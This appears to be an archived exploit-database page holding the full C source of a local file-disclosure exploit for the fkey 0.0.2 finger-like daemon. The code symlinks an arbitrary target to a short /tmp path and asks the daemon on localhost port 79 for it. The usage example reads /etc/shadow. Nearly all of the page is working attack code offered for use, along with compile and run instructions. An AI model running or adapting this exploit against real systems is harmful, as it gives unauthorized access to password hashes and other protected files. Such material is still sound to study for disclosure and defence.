<html><head><title>fkey <= 0.0.2 Local File Accessibility Exploit</title></head><pre>/*[ fkey[v0.0.2]: local/remote file accessibility exploit. ]*
*                                                          *
* by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)         *
*                                                          *
* netris homepage/URL:                                     *
*  http://www.freshmeat.net/projects/fkey                  *
*                                                          *
* compile:                                                 *
*  gcc xfkey.c -o xfkey                                    *
*                                                          *
* syntax:                                                  *
*  # ./xfkey /etc/shadow 2&gt;~/save_filename                 *
*                                                          *
* bug:                                                     *
*  fkey is a finger-like daemon for accessing remote files *
*  in a specified directory.  there is no limitations      *
*  placed on the file acessing other than it must be a     *
*  filename/path equal to 10 or less bytes.  this limits   *
*  the remote possibilities somewhat, but symlinking to a  *
*  short path(ie. /tmp/file) locally can access anything.  *
*  (this exploits locally)                                 *
*                                                          *
* note:                                                    *
*  this is pretty low-risk due to the fact that the        *
*  program isn't very common, just browsing freshmeat.net  *
*  and killing some time.                                  *
************************************************************/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;strings.h&gt;
#include &lt;signal.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

#define TMPFILE &quot;/tmp/xfkey&quot; /* must be 10 characters or less. */

void fkey_connect(unsigned short);
void printe(char *,short);
void sig_alarm(){printe(&quot;alarm/timeout hit.&quot;,1);}

int main(int argc,char **argv){
unsigned short port=79;
if(argc&lt;2){
 printf(&quot;[!] syntax: %s &lt;file&gt; [port]\n&quot;,argv[0]);
 exit(1);
}
if(argc&gt;2)port=atoi(argv[2]);
unlink(TMPFILE);
if(symlink(argv[1],TMPFILE))
 printe(&quot;symlink() failed.&quot;,1);
fkey_connect(port);
unlink(TMPFILE);
exit(0);
}
void fkey_connect(unsigned short port){
int sock=0,l=0,m=0;
char buf[1024+1];
struct hostent *t;
struct sockaddr_in s;
sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
s.sin_family=AF_INET;
s.sin_port=htons(port);
printf(&quot;[*] attempting to connect: localhost:%u.\n&quot;,port);
if((s.sin_addr.s_addr=inet_addr(&quot;127.0.0.1&quot;))){
 if(!(t=gethostbyname(&quot;localhost&quot;)))
  printe(&quot;couldn't resolve hostname.&quot;,1);
 memcpy((char*)&amp;s.sin_addr,(char*)t-&gt;h_addr,
 sizeof(s.sin_addr));
}
signal(SIGALRM,sig_alarm);
alarm(3);
if(connect(sock,(struct sockaddr *)&amp;s,sizeof(s)))
 printe(&quot;connection failed.&quot;,1);
alarm(0);
printf(&quot;[*] successfully connected: localhost:%u.\n&quot;,port);
write(sock,TMPFILE,strlen(TMPFILE));
alarm(5);
for(memset(buf,0,1025);(l=read(sock,buf,1024));memset(buf,0,1025)){
 fputs(buf,stderr);
 m+=l;
}
alarm(0);
if(m&lt;=0)
 printe(&quot;exploit failed, file doesn't exist or zero-length file.&quot;,0);
close(sock);
return;
}
void printe(char *err,short e){
printf(&quot;[!] %s\n&quot;,err);
if(e)exit(1);
return;
}

// milw0rm.com [2005-01-20]</pre></html>